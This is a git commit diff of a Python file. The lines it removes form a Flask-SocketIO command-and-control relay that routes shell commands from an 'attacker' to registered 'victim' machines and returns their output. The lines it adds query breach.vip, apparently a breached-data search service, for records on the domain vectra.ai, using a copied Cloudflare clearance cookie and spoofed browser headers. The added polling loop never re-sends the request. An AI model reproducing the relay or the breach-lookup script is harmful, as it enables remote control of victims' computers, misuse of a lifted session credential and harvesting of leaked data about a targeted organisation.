2d66c8a8745eec845fc83113a07293bd085c9d70
fakehub403 <fakehunt007@gmail.com>
2026-05-13 15:35:53 +0300

    Update main.py

--- main.py
+++ main.py
@@ -1,32 +1,45 @@
-from flask import Flask, request
-from flask_socketio import SocketIO, emit
+import requests, time, random
 
-app = Flask(__name__)
-socketio = SocketIO(app, cors_allowed_origins="*")
 
-# تخزين الاتصالات
-clients = {} # {sid: role}
+headers = {
+    'accept': '*/*',
+    'accept-language': 'en-US,en;q=0.8',
+    'content-type': 'application/json',
+    'origin': 'https://breach.vip',
+    'priority': 'u=1, i',
+    'referer': 'https://breach.vip/',
+    'sec-ch-ua': '"Chromium";v="148", "Brave";v="148", "Not/A)Brand";v="99"',
+    'sec-ch-ua-arch': '"x86"',
+    'sec-ch-ua-bitness': '"64"',
+    'sec-ch-ua-full-version-list': '"Chromium";v="148.0.0.0", "Brave";v="148.0.0.0", "Not/A)Brand";v="99.0.0.0"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-model': '""',
+    'sec-ch-ua-platform': '"Linux"',
+    'sec-ch-ua-platform-version': '""',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-origin',
+    'sec-gpc': '1',
+    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36',
+    'cookie': 'cf_clearance=BvVoCgkBKVxmn.MFl_q.yMlCY.o8XGmZYY66iv0Lrek-1778675187-1.2.1.1-J3vR6eeP5Rph_.jZ_5ybQpYF5ICxzfVbmm4eRmL9i1qZJFgqGnAoc_i3qZYqoWJcmVf0B3u87xZMojEqbuoRNGzMp3OwsI2Y3NB7hxeJQ8d4.OuBcQ5iJWka_fj3gr2bjohpb4ywTuSSsZgfTwo16t6M7rNpPjkCApurD_Hc2vPBNQkpPSOGwnXY6WZHphrSdsnfpikZVLhN7cDWx.Wv0Mv_G3vE7_QnMSQvDd8RGgJ_Nc3RpmvhtId.Pxj50NYgEK3324hZ.QsLTDLxaGlkxUYPY2NjN7GVvtj2uS1qEBHEdS0PueIZE81Od_leAbki6YhtGAVeZfEFSV2UftRMOniG9C3QUw2kO3xwZPBLi4ugimhLA_WbSMXjmkERtO5S5hnAcGxVZKIMUxgfIgrfqFcVke1qbMTiOq6UQbE4RLM',
+}
 
-@socketio.on('connect')
-def handle_connect():
-    print(f"اتصال جديد: {request.sid}")
+json_data = {
+    'term': 'vectra.ai',
+    'fields': [
+        'domain',
+    ],
+    'wildcard': False,
+    'case_sensitive': False,
+    'categories': [],
+}
 
-@socketio.on('register')
-def handle_register(data):
-    clients[request.sid] = data['role'] # role: 'attacker' or 'victim'
-    print(f"الجهاز {request.sid} سجل كـ {data['role']}")
+response = requests.post('https://breach.vip/api/search', headers=headers, json=json_data)
 
-@socketio.on('send_command')
-def handle_command(data):
-    # إرسال الأمر للضحية
-    emit('execute', {'cmd': data['cmd']}, to=data['target_id'])
-
-@socketio.on('result')
-def handle_result(data):
-    # إرسال النتيجة للمهاجم (نبحث عن الـ SID الخاص بالمهاجم)
-    for sid, role in clients.items():
-        if role == 'attacker':
-            emit('output', {'result': data['res'], 'from': request.sid}, to=sid)
-
-if __name__ == '__main__':
-    socketio.run(app)
+while True:
+    time.sleep(random.randint(4, 10))
+    if response.status_code != 200:
+        break
+    else:
+        print(response.status_code)
+        continue
